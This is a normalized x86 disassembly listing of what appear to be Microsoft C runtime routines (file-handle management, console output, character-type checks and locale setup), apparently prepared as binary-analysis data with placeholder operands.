mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ esi + 0x1 ] 0x0
je r-xdata
jb r-xdata
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
push eax
push [ ebp + 0x8 ]
push [ edi + 0x74 ]
push esi
push 0x9
push [ edi + 0x4 ]
call [ MultiByteToWideChar@IAT ]
mov edi [ ebp - 0x10 ]
test eax eax
jne r-xdata
pop esi
pop ebx
leave
retn
mov edi [ edi + 0x74 ]
jmp r-xdata
sub_42a0f0
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_42a185
push 0x8
push r--data
call sub_41ecb0
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov eax edi
sar eax 0x5
and edi 0x1f
shl edi 0x6
mov eax [ eax * 4 + rw-data ]
add eax 0xc
add eax edi
push eax
call [ EnterCriticalSection@IAT ]
xor eax eax
inc eax
call sub_41ecf5
retn
push 0xa
call sub_41ad36
pop ecx
and [ ebp - 0x4 ] 0x0
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42a208
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
inc [ esi + 0x8 ]
sub_42a211
push 0x18
push r--data
call sub_41ecb0
or esi 0xffffffff
mov [ ebp - 0x1c ] esi
and [ ebp - 0x24 ] 0x0
push 0xb
call sub_41adbe
pop ecx
test eax eax
jne r-xdata
push 0xb
call sub_41ad36
pop ecx
and [ ebp - 0x4 ] 0x0
xor ebx ebx
or eax esi
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42a3ad
mov eax esi
mov edi [ ebx * 4 + rw-data ]
test edi edi
je r-xdata
call sub_41ecf5
retn
push 0x40
push 0x20
call sub_41b887
pop ecx
pop ecx
mov ecx eax
mov [ ebp - 0x20 ] ecx
test ecx ecx
je r-xdata
mov [ ebp - 0x20 ] edi
mov eax [ ebx * 4 + rw-data ]
add eax 0x800
cmp edi eax
jae r-xdata
mov [ ebx * 4 + rw-data ] ecx
add [ rw-data ] 0x20
cmp esi 0xffffffff
jne r-xdata
test [ edi + 0x4 ] 0x1
jne r-xdata
mov esi ebx
shl esi 0x5
mov [ ebp - 0x1c ] esi
mov eax esi
sar eax 0x5
mov ecx esi
and ecx 0x1f
shl ecx 0x6
mov eax [ eax * 4 + rw-data ]
mov [ eax + ecx + 0x4 ] 0x1
push esi
call sub_42a185
pop ecx
test eax eax
jne r-xdata
mov [ ecx + 0x4 ] 0xa00
or [ ecx ] 0xffffffff
and [ ecx + 0x8 ] 0x0
add ecx 0x40
mov [ ebp - 0x20 ] ecx
jmp r-xdata
inc ebx
jmp r-xdata
add edi 0x40
jmp r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
or esi 0xffffffff
mov [ ebp - 0x1c ] esi
mov eax [ ebx * 4 + rw-data ]
add eax 0x800
cmp ecx eax
jae r-xdata
mov [ ebp - 0x28 ] ebx
cmp ebx 0x40
jge r-xdata
mov eax [ ebp - 0x24 ]
test eax eax
jne r-xdata
push 0xa
call sub_41ad36
pop ecx
mov [ ebp - 0x4 ] 0x1
cmp [ edi + 0x8 ] 0x0
jne r-xdata
lea eax [ edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
test [ edi + 0x4 ] 0x1
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_42a2e5
push 0xfa0
lea eax [ edi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
inc [ edi + 0x8 ]
mov eax [ ebp - 0x24 ]
test eax eax
jne r-xdata
lea eax [ edi + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
mov [ edi + 0x4 ] 0x1
or [ edi ] 0xffffffff
mov esi edi
sub esi [ ebx * 4 + rw-data ]
sar esi 0x6
mov eax ebx
shl eax 0x5
add esi eax
mov [ ebp - 0x1c ] esi
sub_42a3b6
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push edi
test eax eax
js r-xdata
call sub_41ccf1
mov [ eax ] 0x9
call sub_41ccbd
and [ eax ] 0x0
or eax 0xffffffff
cmp eax [ rw-data ]
jae r-xdata
mov edi eax
sar edi 0x5
mov esi eax
mov ecx [ edi * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
test [ esi + ecx + 0x4 ] 0x1
je r-xdata
cmp [ esi + ecx ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi * 4 + rw-data ]
or [ esi + eax ] 0xffffffff
xor eax eax
jmp r-xdata
xor ecx ecx
sub eax ecx
je r-xdata
pop edi
pop esi
pop ebp
retn
push ecx
push 0xfffffff6
dec eax
je r-xdata
push ecx
push 0xfffffff5
jmp r-xdata
dec eax
jne r-xdata
call [ SetStdHandle@IAT ]
push ecx
push 0xfffffff4
jmp r-xdata
sub_42a43c
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
cmp ecx 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_41ccbd
and [ eax ] 0x0
call sub_41ccf1
mov [ eax ] 0x9
jmp r-xdata
call sub_41ccbd
and [ eax ] 0x0
call sub_41ccf1
mov [ eax ] 0x9
call sub_41f411
cmp ecx [ rw-data ]
jae r-xdata
or eax 0xffffffff
pop ebp
retn
mov eax ecx
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
shl ecx 0x6
test [ eax + ecx + 0x4 ] 0x1
je r-xdata
mov eax [ eax + ecx ]
pop ebp
retn
sub_42a4a3
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
push edi
test ecx ecx
js r-xdata
call sub_41ccf1
mov [ eax ] 0x9
call sub_41ccbd
and [ eax ] 0x0
or eax 0xffffffff
cmp ecx [ rw-data ]
jae r-xdata
mov ebx ecx
sar ebx 0x5
mov edi ecx
mov eax [ ebx * 4 + rw-data ]
and edi 0x1f
shl edi 0x6
cmp [ edi + eax ] 0xffffffff
jne r-xdata
cmp [ rw-data ] 0x1
push esi
mov esi [ ebp + 0xc ]
jne r-xdata
mov eax [ ebx * 4 + rw-data ]
mov [ edi + eax ] esi
xor eax eax
pop esi
jmp r-xdata
sub ecx 0x0
je r-xdata
pop edi
pop ebx
pop ebp
retn
push esi
push 0xfffffff6
dec ecx
je r-xdata
push esi
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push esi
push 0xfffffff4
jmp r-xdata
sub_42a525
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax ecx
and ecx 0x1f
sar eax 0x5
shl ecx 0x6
mov eax [ eax * 4 + rw-data ]
add ecx 0xc
add eax ecx
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_42a54b
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
cmp eax 0xfffffffe
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
call sub_42d9e7
mov eax [ rw-data ]
push 0x0
lea ecx [ ebp - 0x4 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
call [ WriteConsoleW@IAT ]
test eax eax
je r-xdata
mov eax 0xffff
leave
retn
mov ax [ ebp + 0x8 ]
leave
retn
sub_42a58c
push ebp
mov ebp esp
push ecx
mov ax [ ebp + 0x8 ]
mov ecx 0xffff
cmp ax cx
jne r-xdata
mov ecx 0x100
cmp ax cx
jae r-xdata
xor eax eax
leave
retn
lea eax [ ebp - 0x4 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push 0x1
call [ GetStringTypeW@IAT ]
neg eax
sbb eax eax
and eax [ ebp - 0x4 ]
movzx eax ax
movzx ecx ax
mov eax [ rw-data ]
movzx eax [ eax + ecx * 2 ]
jmp r-xdata
movzx ecx [ ebp + 0xc ]
and eax ecx
leave
retn
sub_42a5de
push ebp
mov ebp esp
mov ax [ ebp + 0x8 ]
push 0x30
pop ecx
cmp ax cx
jb r-xdata
or eax 0xffffffff
pop ebp
retn
cmp ax 0x3a
jae r-xdata
mov edx 0xff10
cmp ax dx
jae r-xdata
movzx eax ax
sub eax ecx
pop ebp
retn
mov ecx 0xff1a
mov edx 0x660
cmp ax dx
jb r-xdata
movzx eax ax
sub eax edx
pop ebp
retn
lea ecx [ edx + 0xa ]
cmp ax cx
jae r-xdata
mov edx 0x6f0
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
mov edx 0x966
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0x76 ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0x76 ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0x76 ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0x76 ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
mov edx 0xc66
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0x76 ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0x76 ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
mov edx 0xe50
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0x76 ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
add edx 0x50
cmp ax dx
jb r-xdata
add ecx 0x50
cmp ax cx
jb r-xdata
mov edx 0x1040
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
mov edx 0x17e0
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
add edx 0x30
cmp ax dx
jb r-xdata
add ecx 0x30
jmp r-xdata
cmp ax cx
jb r-xdata
sub_42a77d
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
push esi
cmp edi 0x7fffffff
jbe r-xdata
or [ eax ] 0xffffffff
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push [ ebp + 0x18 ]
lea ecx [ ebp - 0x10 ]
call sub_4199d2
mov eax [ ebp - 0x10 ]
xor esi esi
cmp [ eax + 0xa8 ] esi
jne r-xdata
call sub_41ccf1
push 0x16
pop esi
mov [ eax ] esi
call sub_41f411
jmp r-xdata
xor eax eax
jmp r-xdata
and [ eax ] 0x0
lea ecx [ ebp + 0xc ]
push ecx
push esi
push edi
push ebx
push 0x1
lea ecx [ ebp + 0x14 ]
push ecx
push esi
mov [ ebp + 0xc ] esi
push [ eax + 0x4 ]
call [ WideCharToMultiByte@IAT ]
mov ecx eax
test ecx ecx
je r-xdata
mov ax [ ebp + 0x14 ]
mov ecx 0xff
cmp ax cx
jbe r-xdata
mov eax esi
pop esi
pop edi
pop ebx
leave
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ ebp + 0xc ] esi
jne r-xdata
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
call sub_41ccf1
mov [ eax ] 0x2a
call sub_41ccf1
mov esi [ eax ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
test edi edi
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
call sub_41ccf1
push 0x22
pop esi
mov [ eax ] esi
call sub_41f411
jmp r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ eax ] ecx
jmp r-xdata
mov [ eax ] 0x1
jmp r-xdata
mov [ ebx ] al
push edi
push esi
push ebx
call sub_41cae0
add esp 0xc
push edi
push esi
push ebx
call sub_41cae0
add esp 0xc
sub_42a8c3
push 0x14
push r--data
call sub_41ecb0
and [ ebp - 0x1c ] 0x0
xor eax eax
mov esi [ ebp + 0x18 ]
test esi esi
setne al
test eax eax
jne r-xdata
or [ esi ] 0xffffffff
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
test eax eax
je r-xdata
call sub_41ccf1
push 0x16
pop esi
mov [ eax ] esi
call sub_41f411
mov eax esi
jmp r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
call sub_41ecf5
retn
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x1c ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push esi
lea eax [ ebp - 0x1c ]
push eax
call sub_42a98a
add esp 0x1c
mov edi eax
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42a95e
test edi edi
je r-xdata
mov eax [ ebp + 0x14 ]
and eax 0xfffffe7f
neg eax
sbb eax eax
inc eax
je r-xdata
mov eax edi
or [ esi ] 0xffffffff
sub_42a95e
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
test edi edi
je r-xdata
push [ esi ]
call sub_42a525
pop ecx
mov ecx [ esi ]
mov eax ecx
sar eax 0x5
and ecx 0x1f
shl ecx 0x6
mov eax [ eax * 4 + rw-data ]
and [ eax + ecx + 0x4 ] 0xfe
sub_42a98a
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
call sub_4185f2
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp - 0x4 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_428646
push [ ebp - 0x4 ]
mov esi eax
call sub_417912
add esp 0x20
mov eax esi
pop esi
leave
retn
or eax 0xffffffff
leave
retn
sub_42aa0c
push ebp
mov ebp esp
sub esp 0x14
push esi
mov esi [ ebp + 0x10 ]
test esi esi
jne r-xdata
push ebx
push edi
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x14 ]
call sub_4199d2
mov eax [ ebp - 0x10 ]
xor edx edx
cmp [ eax + 0x8 ] edx
jne r-xdata
xor eax eax
jmp r-xdata
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42da10
add esp 0xc
mov edx eax
jmp r-xdata
pop esi
leave
retn
call sub_41ccf1
mov [ eax ] 0x16
call sub_41f411
mov edx 0x7fffffff
jmp r-xdata
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
pop edi
pop ebx
je r-xdata
movzx ecx [ ebx ]
mov edx [ ebp - 0x10 ]
dec esi
mov eax ecx
inc ebx
test [ eax + edx + 0x19 ] 0x4
push 0x0
mov [ ebp - 0x4 ] ebx
pop edx
je r-xdata
mov eax edx
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
movzx ebx [ edi ]
mov edx [ ebp - 0x10 ]
mov eax ebx
inc edi
test [ eax + edx + 0x19 ] 0x4
push 0x0
pop edx
je r-xdata
test esi esi
jne r-xdata
cmp bx cx
jne r-xdata
test esi esi
jne r-xdata
mov al [ ebx ]
test al al
jne r-xdata
movzx eax [ edi ]
mov ebx [ ebp - 0x10 ]
mov ecx edx
test [ eax + ebx + 0x19 ] 0x4
jne r-xdata
sbb edx edx
and edx 0x2
dec edx
test cx cx
je r-xdata
mov al [ edi ]
dec esi
test al al
je r-xdata
mov ebx edx
jmp r-xdata
shl ecx 0x8
movzx eax al
or cx ax
inc ebx
movzx ecx cx
mov [ ebp - 0x4 ] ebx
mov ecx edx
jmp r-xdata
mov al [ edi ]
movzx ebx al
jmp r-xdata
mov ebx [ ebp - 0x4 ]
test esi esi
jne r-xdata
shl ebx 0x8
movzx eax al
or bx ax
movzx ebx bx
inc edi
jmp r-xdata
sub_42ab39
push ebp
mov ebp esp
sub esp 0x18
lea ecx [ ebp - 0x18 ]
push ebx
push esi
push edi
push [ ebp + 0x14 ]
call sub_4199d2
mov edi [ ebp + 0x10 ]
xor edx edx
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x0
pop edi
pop esi
pop ebx
je r-xdata
mov ecx [ ebp - 0x14 ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax edx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42da88
add esp 0xc
mov edx eax
jmp r-xdata
call sub_41ccf1
mov [ eax ] 0x16
call sub_41f411
mov edx 0x7fffffff
jmp r-xdata
mov ebx [ ebp + 0xc ]
test ebx ebx
jne r-xdata
movzx eax [ esi ]
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x4 ] eax
movzx eax al
dec edi
inc esi
test [ eax + ecx + 0x19 ] 0x4
mov [ ebp - 0x8 ] esi
je r-xdata
mov si [ ebp - 0x4 ]
movzx eax si
test [ eax + ecx + 0x19 ] 0x10
je r-xdata
test edi edi
jne r-xdata
movzx eax [ ebx ]
mov [ ebp - 0x4 ] eax
mov [ ebp + 0x10 ] eax
movzx eax al
inc ebx
test [ eax + ecx + 0x19 ] 0x4
je r-xdata
movzx eax [ eax + ecx + 0x119 ]
mov [ ebp - 0x4 ] eax
mov al [ esi ]
test al al
jne r-xdata
movzx eax [ ebx ]
mov [ ebp - 0x4 ] edx
test [ eax + ecx + 0x19 ] 0x4
jne r-xdata
mov ax [ ebp + 0x10 ]
movzx edx ax
push 0x0
test [ edx + ecx + 0x19 ] 0x10
mov [ ebp + 0x10 ] edx
pop edx
je r-xdata
test edi edi
jne r-xdata
shl [ ebp + 0x10 ] 0x8
movzx eax al
or [ ebp + 0x10 ] ax
mov eax [ ebp + 0x10 ]
movzx eax ax
inc esi
mov [ ebp - 0x8 ] esi
mov si ax
mov [ ebp - 0x4 ] eax
cmp si [ ecx + 0xc ]
jb r-xdata
mov [ ebp - 0x4 ] edx
jmp r-xdata
mov al [ ebx ]
movzx eax al
mov si dx
jmp r-xdata
cmp ax si
jne r-xdata
mov eax [ ebp + 0x10 ]
movzx eax [ eax + ecx + 0x119 ]
mov al [ ebx ]
dec edi
test al al
je r-xdata
mov [ ebp + 0x10 ] edx
jmp r-xdata
cmp si [ ecx + 0x12 ]
jb r-xdata
cmp si [ ecx + 0xe ]
ja r-xdata
mov si [ ebp - 0x4 ]
mov [ ebp + 0x10 ] eax
sbb edx edx
and edx 0x2
dec edx
test si si
je r-xdata
shl [ ebp - 0x4 ] 0x8
movzx eax al
or [ ebp - 0x4 ] ax
mov eax [ ebp - 0x4 ]
movzx eax ax
inc ebx
mov [ ebp + 0x10 ] eax
cmp ax [ ecx + 0xc ]
jb r-xdata
mov ax [ ebp + 0x10 ]
cmp si [ ecx + 0x14 ]
ja r-xdata
add si [ ecx + 0x10 ]
jmp r-xdata
mov esi [ ebp - 0x8 ]
test edi edi
jne r-xdata
cmp ax [ ecx + 0x12 ]
jb r-xdata
cmp ax [ ecx + 0xe ]
ja r-xdata
add si [ ecx + 0x16 ]
jmp r-xdata
jmp r-xdata
cmp ax [ ecx + 0x14 ]
ja r-xdata
add ax [ ecx + 0x10 ]
jmp r-xdata
add ax [ ecx + 0x16 ]
jmp r-xdata
sub_42acf5
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_417912
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_417912
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_417912
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_417912
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_417912
pop ecx
mov eax [ esi + 0x24 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_417912
pop ecx
mov eax [ esi + 0x38 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_417912
pop ecx
mov eax [ esi + 0x3c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_417912
pop ecx
mov eax [ esi + 0x40 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_417912
pop ecx
mov eax [ esi + 0x44 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_417912
pop ecx
mov eax [ esi + 0x48 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_417912
pop ecx
mov eax [ esi + 0x4c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_417912
pop ecx
push eax
call sub_417912
pop ecx
sub_42adf1
push ebp
mov ebp esp
sub esp 0x14
push ebx
mov ebx [ ebp + 0x8 ]
xor ecx ecx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ecx
cmp [ ebx + 0xac ] ecx
jne r-xdata
push 0x50
push 0x1
call sub_41b887
mov esi eax
pop ecx
pop ecx
mov [ ebp + 0x8 ] esi
test esi esi
jne r-xdata
cmp [ ebx + 0xb0 ] ecx
jne r-xdata
push 0x4
call sub_41b8d1
mov edi eax
pop ecx
mov [ ebp - 0x4 ] edi
test edi edi
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
mov edi ecx
mov [ ebp - 0x4 ] ecx
mov esi rw-data
jmp r-xdata
and [ edi ] 0x0
cmp [ ebx + 0xac ] 0x0
je r-xdata
push esi
call sub_417912
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebx + 0x80 ]
test eax eax
je r-xdata
mov edi [ ebp + 0x8 ]
push 0x14
pop ecx
mov esi rw-data
[ edi ] [ esi ]
push 0x4
call sub_41b8d1
pop ecx
mov [ ebp - 0x8 ] eax
test eax eax
jne r-xdata
cmp [ ebx + 0x78 ] 0x0
je r-xdata
push eax
call [ InterlockedDecrement@IAT ]
mov [ edi ] ecx
and [ eax ] 0x0
mov edi [ ebx + 0xac ]
lea eax [ esi + 0xc ]
push eax
push 0x15
push edi
lea eax [ ebp - 0x14 ]
push 0x1
push eax
call sub_41f0bd
mov ecx [ ebp + 0x8 ]
add ecx 0x10
push ecx
push 0x14
push edi
mov esi eax
lea eax [ ebp - 0x14 ]
push 0x1
push eax
call sub_41f0bd
or esi eax
mov eax [ ebp + 0x8 ]
add eax 0x14
push eax
push 0x16
push edi
lea eax [ ebp - 0x14 ]
push 0x1
push eax
call sub_41f0bd
or esi eax
mov eax [ ebp + 0x8 ]
add eax 0x18
push eax
push 0x17
push edi
lea eax [ ebp - 0x14 ]
push 0x1
push eax
call sub_41f0bd
or esi eax
mov eax [ ebp + 0x8 ]
add esp 0x50
add eax 0x1c
push eax
push 0x18
push edi
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x14 ]
push 0x1
push eax
call sub_41f0bd
or esi eax
mov eax [ ebp + 0x8 ]
add eax 0x20
push eax
push 0x50
push edi
lea eax [ ebp - 0x14 ]
push 0x1
push eax
call sub_41f0bd
or esi eax
mov eax [ ebp + 0x8 ]
add eax 0x24
push eax
push 0x51
push edi
lea eax [ ebp - 0x14 ]
push 0x1
push eax
call sub_41f0bd
or esi eax
mov eax [ ebp + 0x8 ]
add eax 0x28
push eax
push 0x1a
push edi
push 0x0
lea eax [ ebp - 0x14 ]
push eax
call sub_41f0bd
or esi eax
mov eax [ ebp + 0x8 ]
add esp 0x50
add eax 0x29
push eax
push 0x19
push edi
lea eax [ ebp - 0x14 ]
push 0x0
push eax
call sub_41f0bd
or esi eax
mov eax [ ebp + 0x8 ]
add eax 0x2a
push eax
push 0x54
push edi
lea eax [ ebp - 0x14 ]
push 0x0
push eax
call sub_41f0bd
or esi eax
mov eax [ ebp + 0x8 ]
add eax 0x2b
push eax
push 0x55
push edi
lea eax [ ebp - 0x14 ]
push 0x0
push eax
call sub_41f0bd
or esi eax
mov eax [ ebp + 0x8 ]
add eax 0x2c
push eax
push 0x56
push edi
lea eax [ ebp - 0x14 ]
push 0x0
push eax
call sub_41f0bd
or esi eax
mov eax [ ebp + 0x8 ]
add esp 0x50
add eax 0x2d
push eax
push 0x57
push edi
lea eax [ ebp - 0x14 ]
push 0x0
push eax
call sub_41f0bd
or esi eax
mov eax [ ebp + 0x8 ]
add eax 0x2e
push eax
push 0x52
push edi
lea eax [ ebp - 0x14 ]
push 0x0
push eax
call sub_41f0bd
or esi eax
mov eax [ ebp + 0x8 ]
add eax 0x2f
push eax
push 0x53
push edi
lea eax [ ebp - 0x14 ]
push 0x0
push eax
call sub_41f0bd
or esi eax
mov eax [ ebp + 0x8 ]
add eax 0x38
push eax
push 0x15
push edi
push 0x2
lea eax [ ebp - 0x14 ]
push eax
call sub_41f0bd
or esi eax
mov eax [ ebp + 0x8 ]
add esp 0x50
add eax 0x3c
push eax
push 0x14
push edi
lea eax [ ebp - 0x14 ]
push 0x2
push eax
call sub_41f0bd
or esi eax
mov eax [ ebp + 0x8 ]
add eax 0x40
push eax
push 0x16
push edi
lea eax [ ebp - 0x14 ]
push 0x2
push eax
call sub_41f0bd
or esi eax
mov eax [ ebp + 0x8 ]
add eax 0x44
push eax
push 0x17
push edi
lea eax [ ebp - 0x14 ]
push 0x2
push eax
call sub_41f0bd
or esi eax
mov eax [ ebp + 0x8 ]
add eax 0x48
push eax
push 0x50
push edi
lea eax [ ebp - 0x14 ]
push 0x2
push eax
call sub_41f0bd
or esi eax
mov eax [ ebp + 0x8 ]
add esp 0x50
add eax 0x4c
push eax
push 0x51
push edi
lea eax [ ebp - 0x14 ]
push 0x2
push eax
call sub_41f0bd
add esp 0x14
or eax esi
je r-xdata
push esi
call sub_417912
push edi
call sub_417912
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x78 ] eax
mov [ ebx + 0x80 ] edi
mov [ ebx + 0x84 ] esi
xor eax eax
push [ ebx + 0x78 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov edx [ ebp - 0xc ]
mov edx [ edx ]
jmp r-xdata
mov ebx [ ebp + 0x8 ]
push ebx
call sub_42acf5
push ebx
call sub_417912
mov eax [ ebp - 0x4 ]
push eax
call sub_417912
mov eax [ ebp - 0x8 ]
push eax
call sub_417912
add esp 0x10
jmp r-xdata
pop ecx
jmp r-xdata
push [ ebx + 0x84 ]
call sub_417912
push [ ebx + 0x78 ]
call sub_417912
pop ecx
pop ecx
cmp [ edx ] 0x0
jne r-xdata
mov al [ edx ]
cmp al 0x30
jl r-xdata
jmp r-xdata
cmp al 0x3b
jne r-xdata
cmp al 0x39
jg r-xdata
mov eax [ ebx + 0x84 ]
mov esi [ ebp + 0x8 ]
mov eax [ eax ]
mov [ esi ] eax
mov eax [ ebx + 0x84 ]
mov edi [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebx + 0x84 ]
xor ecx ecx
mov eax [ eax + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x84 ]
inc ecx
mov eax [ eax + 0x30 ]
mov [ esi + 0x30 ] eax
mov eax [ ebx + 0x84 ]
mov eax [ eax + 0x34 ]
mov [ esi + 0x34 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax ] ecx
test edi edi
je r-xdata
inc edx
mov esi edx
sub al 0x30
mov [ edx ] al
mov al [ esi + 0x1 ]
mov [ esi ] al
lea esi [ esi + 0x1 ]
cmp [ esi ] 0x0
jne r-xdata
jmp r-xdata
sub_42b193
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
